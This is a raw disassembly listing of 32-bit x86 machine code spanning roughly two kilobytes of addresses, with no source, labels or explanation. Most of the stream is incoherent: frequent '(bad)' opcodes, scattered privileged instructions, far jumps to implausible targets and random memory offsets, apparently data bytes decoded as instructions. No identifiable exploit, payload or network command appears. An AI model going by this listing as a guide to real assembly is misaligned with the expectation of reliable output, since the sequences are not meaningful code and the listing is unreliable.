  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
